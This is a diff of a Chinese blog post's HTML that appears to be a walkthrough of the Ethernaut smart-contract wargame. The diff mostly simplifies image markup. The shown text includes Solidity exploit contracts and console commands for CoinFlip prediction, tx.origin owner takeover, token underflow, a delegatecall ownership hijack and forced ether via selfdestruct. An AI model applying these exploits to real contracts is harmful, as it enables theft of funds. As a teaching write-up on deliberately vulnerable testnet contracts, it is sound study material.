@@ -138,6 +138,13 @@
               </a>
             </li>
         
+            <li class="waves-block waves-effect">
+              <a href="/friends">
+                <i class="icon icon-lg icon-address-book"></i>
+                Friends
+              </a>
+            </li>
+        
       </ul>
     </div>
   </div>
@@ -223,99 +230,27 @@
 <hr>
 <h2 id="level-0-Hello-Ethernaut"><a href="#level-0-Hello-Ethernaut" class="headerlink" title="level 0 - Hello Ethernaut"></a>level 0 - Hello Ethernaut</h2><p><a href="https://ethernaut.zeppelin.solutions/level/0xdf51a9e8ce57e7787e4a27dd19880fd7106b9a5c" target="_blank" rel="noopener">题目链接</a></p>
 <h3 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h3><p>首先是简单的教程，先下载MetaMask插件并且注册账号，然后设置钱包并使用Ropsten测试网络</p>
-<div style="width: 50%; margin: auto"><figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="/2019/01/08/ethernautd训练/1.jpg" alt="MetaMask和Ropsten测试网络" title="">
-                </div>
-                <div class="image-caption">MetaMask和Ropsten测试网络</div>
-            </figure></div>
+<div style="width: 50%; margin: auto"><img src="/2019/01/08/ethernautd训练/1.jpg" alt="MetaMask和Ropsten测试网络"></div>
 
 <h3 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h3><p>打开控制台，然后会发现给了合约地址和help</p>
-<div style="width: 50%; margin: auto"><figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="/2019/01/08/ethernautd训练/2.jpg" alt="合约地址" title="">
-                </div>
-                <div class="image-caption">合约地址</div>
-            </figure></div><br><div style="width: 50%; margin: auto"><figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="/2019/01/08/ethernautd训练/3.jpg" alt="help" title="">
-                </div>
-                <div class="image-caption">help</div>
-            </figure></div><br>其中level地址为 <code>0xdf51a9e8ce57e7787e4a27dd19880fd7106b9a5c</code><br><br>在Ropsten测试网络下还会有你的player地址和Ethernaut地址<br>使用player指令可以直接获得player地址<br><div style="width: 50%; margin: auto"><figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="/2019/01/08/ethernautd训练/4.jpg" alt="player地址和Ethernaut地址" title="">
-                </div>
-                <div class="image-caption">player地址和Ethernaut地址</div>
-            </figure></div>
+<div style="width: 50%; margin: auto"><img src="/2019/01/08/ethernautd训练/2.jpg" alt="合约地址"></div><br><div style="width: 50%; margin: auto"><img src="/2019/01/08/ethernautd训练/3.jpg" alt="help"></div><br>其中level地址为 <code>0xdf51a9e8ce57e7787e4a27dd19880fd7106b9a5c</code><br><br>在Ropsten测试网络下还会有你的player地址和Ethernaut地址<br>使用player指令可以直接获得player地址<br><div style="width: 50%; margin: auto"><img src="/2019/01/08/ethernautd训练/4.jpg" alt="player地址和Ethernaut地址"></div>
 
 <h3 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h3><p>之后会让你使用getBalance函数获得你的以太坊的数量，并且让你使用help(),由于我们第二步使用过，就不再演示了<br>PS:由于在Ropsten测试网络中可以直接通过Ether Faucet获得测试以太坊，所以我的数额为7</p>
-<div style="width: 50%; margin: auto"><figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="/2019/01/08/ethernautd训练/5.jpg" alt="调用getBalance" title="">
-                </div>
-                <div class="image-caption">调用getBalance</div>
-            </figure></div>
+<div style="width: 50%; margin: auto"><img src="/2019/01/08/ethernautd训练/5.jpg" alt="调用getBalance"></div>
 
 <h3 id="第四步"><a href="#第四步" class="headerlink" title="第四步"></a>第四步</h3><p>使用ethernaut指令可以直接输出当前合约的有关信息，其中的abi可以理解为合约中的<code>公共</code>方法列表，当然在下面可以看见例如<code>owner: f()</code>之类的东西就是方法的具体信息</p>
-<div style="width: 50%; margin: auto"><figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="/2019/01/08/ethernautd训练/6.jpg" alt="查看合约信息" title="">
-                </div>
-                <div class="image-caption">查看合约信息</div>
-            </figure></div>
+<div style="width: 50%; margin: auto"><img src="/2019/01/08/ethernautd训练/6.jpg" alt="查看合约信息"></div>
 
 <h3 id="第五步"><a href="#第五步" class="headerlink" title="第五步"></a>第五步</h3><p>与ABI互动，也就是可以调用上一步说的方法列表里的方法，系统让我们调用<code>ethernaut.owner()</code>，返回的是智能合约的拥有者</p>
-<div style="width: 50%; margin: auto"><figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="/2019/01/08/ethernautd训练/7.jpg" alt="调用owner" title="">
-                </div>
-                <div class="image-caption">调用owner</div>
-            </figure></div>
+<div style="width: 50%; margin: auto"><img src="/2019/01/08/ethernautd训练/7.jpg" alt="调用owner"></div>
 
 <h3 id="第六步"><a href="#第六步" class="headerlink" title="第六步"></a>第六步</h3><p>这一步就是让我们通过上面提到的Ether Faucet获得测试以太坊，可以将MetaMask调至<code>中文</code>，然后点击<code>存入</code>-<code>测试水管</code>，之后点击<code>request 1 ether from faucet</code>就行</p>
 <h3 id="第七步"><a href="#第七步" class="headerlink" title="第七步"></a>第七步</h3><p>生成合约实例，点击下面的蓝色按钮即可，需要等待一段时间</p>
-<div style="width: 50%; margin: auto"><figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="/2019/01/08/ethernautd训练/8.jpg" alt="获取实例按钮" title="">
-                </div>
-                <div class="image-caption">获取实例按钮</div>
-            </figure></div><br>成功之后会显示下图<br><div style="width: 50%; margin: auto"><figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="/2019/01/08/ethernautd训练/9.jpg" alt="成功" title="">
-                </div>
-                <div class="image-caption">成功</div>
-            </figure></div>
+<div style="width: 50%; margin: auto"><img src="/2019/01/08/ethernautd训练/8.jpg" alt="获取实例按钮"></div><br>成功之后会显示下图<br><div style="width: 50%; margin: auto"><img src="/2019/01/08/ethernautd训练/9.jpg" alt="成功"></div>
 
 <h3 id="第八步"><a href="#第八步" class="headerlink" title="第八步"></a>第八步</h3><p>题目告诉你生成的合约实例可以调用合约的ABI，也可以自己试试，用<code>contract.方法</code>就行</p>
 <h3 id="第九步"><a href="#第九步" class="headerlink" title="第九步"></a>第九步</h3><p>从<code>contract.info()</code>入手跟着走下去就行</p>
-<div style="width: 50%; margin: auto"><figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="/2019/01/08/ethernautd训练/10.jpg" alt="10" title="">
-                </div>
-                <div class="image-caption">10</div>
-            </figure></div><br><div style="width: 50%; margin: auto"><figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="/2019/01/08/ethernautd训练/11.jpg" alt="11" title="">
-                </div>
-                <div class="image-caption">11</div>
-            </figure></div><br><div style="width: 50%; margin: auto"><figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="/2019/01/08/ethernautd训练/12.jpg" alt="12" title="">
-                </div>
-                <div class="image-caption">12</div>
-            </figure></div>
+<div style="width: 50%; margin: auto"><img src="/2019/01/08/ethernautd训练/10.jpg" alt="10"></div><br><div style="width: 50%; margin: auto"><img src="/2019/01/08/ethernautd训练/11.jpg" alt="11"></div><br><div style="width: 50%; margin: auto"><img src="/2019/01/08/ethernautd训练/12.jpg" alt="12"></div>
 
 <p>之后点击<code>submit instance</code>即可过关。</p>
 <h3 id="通关后的彩蛋"><a href="#通关后的彩蛋" class="headerlink" title="通关后的彩蛋"></a>通关后的彩蛋</h3><blockquote>
@@ -332,33 +267,15 @@
 <h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>最终目的是调用<code>withdraw()</code>方法将余额清零，也就是我们要成为<code>owner</code><br>contribute里面虽然有可能称为owner，但是代价太过昂贵（1000ETH且每次只能发送小于0.001的ETH）<br>在<code>fallback</code>中只要满足<code>msg.value&gt;0</code>且<code>contributions[msg.sender]&gt;0</code>即可成为owner<br>其中<code>msg.value</code>我们可以直接发送过去，而<code>contributions[msg.sender]</code>我们需要调用<code>contribute()</code>这个函数，也就是参数满足<code>value&lt;0.001</code>的条件就行</p>
 <h3 id="具体步骤"><a href="#具体步骤" class="headerlink" title="具体步骤"></a>具体步骤</h3><p>1.调用<code>contribute</code>函数，传入参数<code>value=1</code><br>其中value的单位是wei</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> eth = <span class="number">1e9</span> Gwei = <span class="number">1e18</span> wei</span><br></pre></td></tr></table></figure>
-<div style="width: 50%; margin: auto"><figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="/2019/01/08/ethernautd训练/15.jpg" alt="15" title="">
-                </div>
-                <div class="image-caption">15</div>
-            </figure></div>
+<div style="width: 50%; margin: auto"><img src="/2019/01/08/ethernautd训练/15.jpg" alt="15"></div>
 
 
 <p>2.调用<code>send</code>函数，传入参数1(也可以在钱包里直接打钱，不过听说打钱会有bug，就直接用send了，当然也可以用<code>contract.sendTransaction({value: 100})</code>)， 由于<code>send</code>函数会调用fallback函数，我们便成为了<code>owner</code></p>
-<div style="width: 50%; margin: auto"><figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="/2019/01/08/ethernautd训练/16.jpg" alt="16" title="">
-                </div>
-                <div class="image-caption">16</div>
-            </figure></div>
+<div style="width: 50%; margin: auto"><img src="/2019/01/08/ethernautd训练/16.jpg" alt="16"></div>
 
 
 <p>3.调用<code>withdraw</code>函数，将钱卷走</p>
-<div style="width: 50%; margin: auto"><figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="/2019/01/08/ethernautd训练/17.jpg" alt="17" title="">
-                </div>
-                <div class="image-caption">17</div>
-            </figure></div>
+<div style="width: 50%; margin: auto"><img src="/2019/01/08/ethernautd训练/17.jpg" alt="17"></div>
 
 
 <p>4.点击<code>submit instance</code>即可过关。</p>
@@ -373,22 +290,10 @@
 <h3 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">'zeppelin-solidity/contracts/ownership/Ownable.sol'</span>;</span><br><span class="line"></span><br><span class="line">contract Fallout <span class="keyword">is</span> Ownable &#123;</span><br><span class="line"></span><br><span class="line">  mapping (address =&gt; uint) allocations;</span><br><span class="line"></span><br><span class="line">  /* constructor */</span><br><span class="line">  function Fal1out() public payable &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">    allocations[owner] = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function allocate() public payable &#123;</span><br><span class="line">    allocations[msg.sender] += msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function sendAllocation(address allocator) public &#123;</span><br><span class="line">    require(allocations[allocator] &gt; <span class="number">0</span>);</span><br><span class="line">    allocator.transfer(allocations[allocator]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function collectAllocations() public onlyOwner &#123;</span><br><span class="line">    msg.sender.transfer(this.balance);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function allocatorBalance(address allocator) public view returns (uint) &#123;</span><br><span class="line">    <span class="keyword">return</span> allocations[allocator];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <h3 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h3><p>可以看出函数的构造函数写错了，<code>Fallout</code>写成了<code>Fal1out</code>，变为了谁都可以调用的函数(我们无法调用构造函数)。<br>所以我们可以调用构造函数成为<code>owner</code>，然后再调用<code>collectAllocations</code>取钱</p>
 <h3 id="具体步骤-1"><a href="#具体步骤-1" class="headerlink" title="具体步骤"></a>具体步骤</h3><p>1.调用<code>Fal1out</code>函数，成为<code>owner</code></p>
-<div style="width: 50%; margin: auto"><figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="/2019/01/08/ethernautd训练/19.jpg" alt="19" title="">
-                </div>
-                <div class="image-caption">19</div>
-            </figure></div>
+<div style="width: 50%; margin: auto"><img src="/2019/01/08/ethernautd训练/19.jpg" alt="19"></div>
 
 <p>2.调用<code>collectAllocations</code>函数，将钱卷走</p>
-<div style="width: 50%; margin: auto"><figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="/2019/01/08/ethernautd训练/20.jpg" alt="20" title="">
-                </div>
-                <div class="image-caption">20</div>
-            </figure></div>
+<div style="width: 50%; margin: auto"><img src="/2019/01/08/ethernautd训练/20.jpg" alt="20"></div>
 
 <p>3.点击<code>submit instance</code>即可过关。</p>
 <h3 id="通关后的彩蛋-2"><a href="#通关后的彩蛋-2" class="headerlink" title="通关后的彩蛋"></a>通关后的彩蛋</h3><blockquote>
@@ -406,22 +311,10 @@
 <p>2.我们每次产生的随机数和前一块的hash有关，只需要编写合约进行同步计算即可</p>
 <h3 id="具体步骤-2"><a href="#具体步骤-2" class="headerlink" title="具体步骤"></a>具体步骤</h3><p>1.编写exp合约<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line">contract CoinFlip &#123;</span><br><span class="line">  uint256 public consecutiveWins;</span><br><span class="line">  uint256 lastHash;</span><br><span class="line">  uint256 FACTOR = <span class="number">57896044618658097711785492504343953926634992332820282019728792003956564819968</span>;</span><br><span class="line"></span><br><span class="line">  function CoinFlip() public &#123;</span><br><span class="line">    consecutiveWins = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function flip(bool _guess) public returns (bool) &#123;</span><br><span class="line">    uint256 blockValue = uint256(block.blockhash(block.number<span class="number">-1</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (lastHash == blockValue) &#123;</span><br><span class="line">      revert();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    lastHash = blockValue;</span><br><span class="line">    uint256 coinFlip = blockValue / FACTOR;</span><br><span class="line">    bool side = coinFlip == 1 ? true : false;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (side == _guess) &#123;</span><br><span class="line">      consecutiveWins++;</span><br><span class="line">      <span class="keyword">return</span> true;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      consecutiveWins = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span> false;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract exp&#123;</span><br><span class="line">  CoinFlip C;</span><br><span class="line">  uint256 lastHash;</span><br><span class="line">  uint256 FACTOR = <span class="number">57896044618658097711785492504343953926634992332820282019728792003956564819968</span></span><br><span class="line"></span><br><span class="line">  function setCoinflip(address _addr) public &#123;</span><br><span class="line">    C = CoinFlip(_addr);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function hack() public OwnerOnly &#123;</span><br><span class="line">    uint256 blockValue = uint256(block.blockhash(block.number<span class="number">-1</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (lastHash == blockValue) &#123;</span><br><span class="line">      revert();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    lastHash = blockValue;</span><br><span class="line">    uint256 coinFlip = blockValue / FACTOR;</span><br><span class="line">    bool side = coinFlip == 1 ? true : false;</span><br><span class="line"></span><br><span class="line">    C.flip(side);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
 <p>2.部署在remix上并运行<code>hack</code>方法十次</p>
-<div style="width: 50%; margin: auto"><figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="/2019/01/08/ethernautd训练/22.jpg" alt="22" title="">
-                </div>
-                <div class="image-caption">22</div>
-            </figure></div>
+<div style="width: 50%; margin: auto"><img src="/2019/01/08/ethernautd训练/22.jpg" alt="22"></div>
 
 <p>3.通过命令<code>contract.consecutiveWins()</code>可查询猜对的次数</p>
-<div style="width: 50%; margin: auto"><figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="/2019/01/08/ethernautd训练/23.jpg" alt="23" title="">
-                </div>
-                <div class="image-caption">23</div>
-            </figure></div>
+<div style="width: 50%; margin: auto"><img src="/2019/01/08/ethernautd训练/23.jpg" alt="23"></div>
 
 <p>4.当猜对的次数为10次以上之后，点击<code>submit instance</code>即可过关。</p>
 <h3 id="通关后的彩蛋-3"><a href="#通关后的彩蛋-3" class="headerlink" title="通关后的彩蛋"></a>通关后的彩蛋</h3><blockquote>
@@ -437,31 +330,13 @@
 <h3 id="解题思路-3"><a href="#解题思路-3" class="headerlink" title="解题思路"></a>解题思路</h3><p>1.我们可以编写代码调用<code>changeOwner</code>，传入我们的地址，就可以变成合约<code>owner</code>了</p>
 <h3 id="具体步骤-3"><a href="#具体步骤-3" class="headerlink" title="具体步骤"></a>具体步骤</h3><p>1.编写exp合约<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line">contract Telephone &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  function Telephone() public &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function changeOwner(address _owner) public &#123; //如果消息发送者不是owner就将owner转移给_owner</span><br><span class="line">    <span class="keyword">if</span> (tx.origin != msg.sender) &#123;</span><br><span class="line">      owner = _owner;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract exp&#123;</span><br><span class="line">    Telephone tel;</span><br><span class="line">    function setAttackAddr(address _addr)&#123;</span><br><span class="line">        tel = Telephone(_addr);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function attack(address _addr)&#123;</span><br><span class="line">        tel.changeOwner(_addr);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
 <p>2.获取合约地址和我们自己的用户地址，并查询合约拥有者</p>
-<div style="width: 50%; margin: auto"><figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="/2019/01/08/ethernautd训练/25.jpg" alt="25" title="">
-                </div>
-                <div class="image-caption">25</div>
-            </figure></div>
+<div style="width: 50%; margin: auto"><img src="/2019/01/08/ethernautd训练/25.jpg" alt="25"></div>
 
 <p>3.进行攻击</p>
-<div style="width: 50%; margin: auto"><figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="/2019/01/08/ethernautd训练/26.jpg" alt="26" title="">
-                </div>
-                <div class="image-caption">26</div>
-            </figure></div>
+<div style="width: 50%; margin: auto"><img src="/2019/01/08/ethernautd训练/26.jpg" alt="26"></div>
 
 <p>4.再次查询合约拥有者，发现变成了我们，攻击完毕</p>
-<div style="width: 50%; margin: auto"><figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="/2019/01/08/ethernautd训练/27.jpg" alt="27" title="">
-                </div>
-                <div class="image-caption">27</div>
-            </figure></div>
+<div style="width: 50%; margin: auto"><img src="/2019/01/08/ethernautd训练/27.jpg" alt="27"></div>
 
 <p>5.点击<code>submit instance</code>即可过关。</p>
 <h3 id="通关后的彩蛋-4"><a href="#通关后的彩蛋-4" class="headerlink" title="通关后的彩蛋"></a>通关后的彩蛋</h3><blockquote>
@@ -480,22 +355,10 @@
 <h3 id="源码-4"><a href="#源码-4" class="headerlink" title="源码"></a>源码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line">contract Token &#123;</span><br><span class="line"></span><br><span class="line">  mapping(address =&gt; uint) balances;</span><br><span class="line">  uint public totalSupply;</span><br><span class="line"></span><br><span class="line">  function Token(uint _initialSupply) public &#123; //初始化代币给owner</span><br><span class="line">    balances[msg.sender] = totalSupply = _initialSupply;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function transfer(address _to, uint _value) public returns (bool) &#123; //将msg.sender的value个代币转给_to，并且msg.sender-value的值大于<span class="number">0</span></span><br><span class="line">    require(balances[msg.sender] - _value &gt;= <span class="number">0</span>);</span><br><span class="line">    balances[msg.sender] -= _value;</span><br><span class="line">    balances[_to] += _value;</span><br><span class="line">    <span class="keyword">return</span> true;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address _owner) public view returns (uint balance) &#123; //查询代币数量</span><br><span class="line">    <span class="keyword">return</span> balances[_owner];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <h3 id="解题思路-4"><a href="#解题思路-4" class="headerlink" title="解题思路"></a>解题思路</h3><p>1.从<code>transfer</code>函数可以看出是很明显的整数溢出漏洞，转给别的地址大于20个代币即可</p>
 <h3 id="具体步骤-4"><a href="#具体步骤-4" class="headerlink" title="具体步骤"></a>具体步骤</h3><p>1.初始化信息</p>
-<div style="width: 50%; margin: auto"><figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="/2019/01/08/ethernautd训练/29.jpg" alt="29" title="">
-                </div>
-                <div class="image-caption">29</div>
-            </figure></div>
+<div style="width: 50%; margin: auto"><img src="/2019/01/08/ethernautd训练/29.jpg" alt="29"></div>
 
 <p>2.进行转账操作，随便填一个地址，然后查询我们和转账地址的代币数，发现已经溢出</p>
-<div style="width: 50%; margin: auto"><figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="/2019/01/08/ethernautd训练/30.jpg" alt="30" title="">
-                </div>
-                <div class="image-caption">30</div>
-            </figure></div>
+<div style="width: 50%; margin: auto"><img src="/2019/01/08/ethernautd训练/30.jpg" alt="30"></div>
 
 <p>3.点击<code>submit instance</code>即可过关。</p>
 <h3 id="通关后的彩蛋-5"><a href="#通关后的彩蛋-5" class="headerlink" title="通关后的彩蛋"></a>通关后的彩蛋</h3><blockquote>
@@ -515,22 +378,10 @@
 <h3 id="预备知识-3"><a href="#预备知识-3" class="headerlink" title="预备知识"></a>预备知识</h3><p>1.delegatecall<br>简单来说就是<code>delegatecall</code>执行别的合约的方法的时候的作用域是调用合约的环境。比如别的合约的方法修改了它的第一个参数b，调用合约通过<code>delegatecall</code>调用该方法时，会把调用合约的第一个参数给修改掉(并且哪怕名字不一样也可以)<br>具体内容可以参考这篇文章，写的挺详细的<br><a href="https://blog.csdn.net/fly_hps/article/details/81218219" target="_blank" rel="noopener">链接</a></p>
 <h3 id="解题思路-5"><a href="#解题思路-5" class="headerlink" title="解题思路"></a>解题思路</h3><p>1.首先我们的目的是通过<code>delegatecall</code>来执行<code>Delegate</code>合约中的<code>pwn</code>方法，进而通过<code>delegatecall</code>的漏洞来改变<code>Delegation</code>合约的<code>owner</code>，也就是改成我们。<br>2.为了执行<code>delegatecall</code>，我们需要执行<code>fallback</code>函数，传入的data参数应该为<code>pwn()</code>的函数id，即其函数签名的sha3的前4个bytes(也就是4*2+2(0x)=10位)</p>
 <h3 id="具体步骤-5"><a href="#具体步骤-5" class="headerlink" title="具体步骤"></a>具体步骤</h3><p>1.初始化实例并查看合约的<code>owner</code></p>
-<div style="width: 50%; margin: auto"><figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="/2019/01/08/ethernautd训练/32.jpg" alt="32" title="">
-                </div>
-                <div class="image-caption">32</div>
-            </figure></div>
+<div style="width: 50%; margin: auto"><img src="/2019/01/08/ethernautd训练/32.jpg" alt="32"></div>
 
 <p>2.构造exp并执行<code>contract.sendTransaction({data:web3.sha3(&quot;pwn()&quot;).slice(0,10)})</code>.完毕之后查看<code>owner</code>，发现已经变成我们</p>
-<div style="width: 50%; margin: auto"><figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="/2019/01/08/ethernautd训练/33.jpg" alt="33" title="">
-                </div>
-                <div class="image-caption">33</div>
-            </figure></div>
+<div style="width: 50%; margin: auto"><img src="/2019/01/08/ethernautd训练/33.jpg" alt="33"></div>
 
 <p>3.点击<code>submit instance</code>即可过关。</p>
 <h3 id="通关后的彩蛋-6"><a href="#通关后的彩蛋-6" class="headerlink" title="通关后的彩蛋"></a>通关后的彩蛋</h3><blockquote>
@@ -547,13 +398,7 @@
 <h3 id="解题思路-6"><a href="#解题思路-6" class="headerlink" title="解题思路"></a>解题思路</h3><p>1.我们自己编写一个合约并约束一个方法为<code>payable</code>，并通过该方法向此合约中打钱。<br>2.调用此合约的<code>selfdestruct</code>函数，将目标合约地址作为参数传入。这样此合约的剩下的钱就会被转移过去。</p>
 <h3 id="具体步骤-6"><a href="#具体步骤-6" class="headerlink" title="具体步骤"></a>具体步骤</h3><p>1.编写exp合约<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">contract exp&#123;</span><br><span class="line">    address attackAddr;</span><br><span class="line">    function init(address _addr) public payable&#123;</span><br><span class="line">        attackAddr=_addr;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function attack()&#123;</span><br><span class="line">        selfdestruct(attackAddr);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
 <p>2.先调用<code>init</code>函数设置攻击合约的地址，并附加上一定数额的ETH</p>
-<div style="width: 50%; margin: auto"><figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="/2019/01/08/ethernautd训练/34.jpg" alt="34" title="">
-                </div>
-                <div class="image-caption">34</div>
-            </figure></div>
